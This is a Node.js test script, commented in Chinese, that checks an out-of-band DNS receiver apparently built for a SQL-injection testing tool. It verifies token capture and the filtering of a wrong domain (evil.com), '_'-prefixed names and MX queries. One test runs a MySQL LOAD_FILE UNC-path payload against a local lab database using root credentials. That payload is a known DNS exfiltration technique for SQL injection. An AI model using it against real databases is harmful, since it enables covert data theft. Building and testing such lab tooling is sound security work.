// ============================================================================
// e2e/oob-real-lab/dns-probe.mjs —— DNS OOB 接收端捕获能力真机探针（v2，端口 53）
// 修正依据（diag-nslookup2.mjs 双端口诊断）：
//   Windows nslookup 单次查询模式忽略 -port= 参数，报文发往默认 53 —— 接收端直接监听
//   53（实战形态，本机端口空闲）即可让真实工具走通。
// 验证面：
//   ① 自构 DNS A 查询 → token 提取注册（waitForToken 命中）
//   ② 真实工具 nslookup（默认 53）→ 同样命中
//   ③ B-8 错域过滤；④ `_` 前缀过滤；⑤ 非 A/AAAA（MX）过滤
//   ⑥ 经验测试：真 MySQL 8.0.28 LOAD_FILE UNC 是否发起 DNS 解析（诚实口径）
// ============================================================================
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import dgram from 'node:dgram';
import { execFile } from 'node:child_process';

const require = createRequire(new URL('../../server/package.json', import.meta.url));
const { oobReceiver } = await import(pathToFileURL(resolve(dirname(fileURLToPath(import.meta.url)), '../../server/src/core/oobReceiver.js')).href);

const DNS_PORT = 53; // 实战形态：真实 nslookup 默认发 53（-port= 参数在单次查询模式下被忽略）
const DNS_DOMAIN = 'oob-lab.local';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function buildDnsQuery(name, { id = 0x1234, qtype = 1 } = {}) {
  const header = Buffer.alloc(12);
  header.writeUInt16BE(id, 0);
  header.writeUInt16BE(0x0100, 2);
  header.writeUInt16BE(1, 4);
  const parts = [];
  for (const label of String(name).split('.')) {
    const len = Buffer.byteLength(label);
    const b = Buffer.alloc(1 + len);
    b.writeUInt8(len, 0);
    b.write(label, 1);
    parts.push(b);
  }
  const qname = Buffer.concat([...parts, Buffer.from([0])]);
  const tail = Buffer.alloc(4);
  tail.writeUInt16BE(qtype, 0);
  tail.writeUInt16BE(1, 2);
  return Buffer.concat([header, qname, tail]);
}

const sock = dgram.createSocket('udp4');
sock.unref();
function sendQuery(name, opts) {
  return new Promise((res, rej) => {
    sock.send(buildDnsQuery(name, opts), DNS_PORT, '127.0.0.1', (e) => (e ? rej(e) : res()));
  });
}

console.log('[setup] 启动 OOB 接收端（HTTP 8899 + DNS ' + DNS_PORT + '，域名 ' + DNS_DOMAIN + '）');
await oobReceiver.start({
  enabled: true,
  callbackBase: '127.0.0.1:8899',
  httpPort: 8899,
  timeoutMs: 5000,
  dnsOob: true,
  dnsDomain: DNS_DOMAIN,
  dnsPort: DNS_PORT,
});

let pass = 0;
let fail = 0;
const check = (ok, label) => { console.log(`${label}：${ok ? 'PASS ✅' : 'FAIL ❌'}`); ok ? pass++ : fail++; };

// ① 自构 A 查询命中
{
  const t = 'probeaaaa01';
  await sendQuery(`${t}.${DNS_DOMAIN}`);
  check(await oobReceiver.waitForToken(t, 4000), '① 自构 A 查询捕获');
}

// ② 真实工具 nslookup（默认端口 53）
{
  const t = 'probenslk02';
  await new Promise((res) => {
    execFile('nslookup', [`${t}.${DNS_DOMAIN}`, '127.0.0.1'], { timeout: 8000 }, () => res());
  });
  check(await oobReceiver.waitForToken(t, 3000), '② nslookup 真实查询捕获');
}

// ③ B-8 错域过滤
{
  const t = 'wrongdom03';
  await sendQuery(`${t}.evil.com`);
  await sleep(700);
  const hit = await oobReceiver.waitForToken(t, 800);
  check(!hit, '③ 错域（evil.com）不注册');
}

// ④ `_` 前缀过滤
{
  await sendQuery(`_acme-challenge.${DNS_DOMAIN}`);
  await sleep(700);
  const hit = await oobReceiver.waitForToken('_acme-challenge', 800);
  check(!hit, '④ `_` 前缀过滤');
}

// ⑤ 非 A/AAAA（MX=15）不注册
{
  const t = 'mxprobe005';
  await sendQuery(`${t}.${DNS_DOMAIN}`, { qtype: 15 });
  await sleep(700);
  const hit = await oobReceiver.waitForToken(t, 800);
  check(!hit, '⑤ MX 查询不注册（仅 A/AAAA）');
}

// ⑥ 经验测试：真 MySQL LOAD_FILE UNC 是否触发 DNS 解析
{
  const t = 'mysqlunc06';
  let mysql = null;
  try {
    const mysql2 = require('mysql2/promise');
    mysql = await mysql2.createConnection({ host: '127.0.0.1', port: 3307, user: 'root', password: 'root', database: 'sqli_lab' });
    const [sp] = await mysql.query('SELECT @@secure_file_priv AS v');
    console.log(`   MySQL secure_file_priv = ${JSON.stringify(sp[0].v)}`);
    await mysql.query(`SELECT LOAD_FILE(CONCAT(0x5c5c,'${t}.${DNS_DOMAIN}',0x5c78)) AS x`);
  } catch (e) {
    console.log(`   MySQL 连接/查询失败（跳过经验测试）：${e.message.slice(0, 90)}`);
  } finally {
    if (mysql) await mysql.end().catch(() => {});
  }
  await sleep(1500);
  const hit = await oobReceiver.waitForToken(t, 800);
  console.log(`⑥ 真 MySQL LOAD_FILE UNC DNS 解析：${hit ? '发生 ✅（可作 MySQL DNS OOB 载体）' : '未发生（诚实负结果，Windows MySQL 对 UNC-DNS 解析不外带）'}`);
}

sock.close();
console.log(`\n===== DNS OOB 接收端验证：${pass} PASS / ${fail} FAIL =====`);
process.exit(fail === 0 ? 0 : 1);
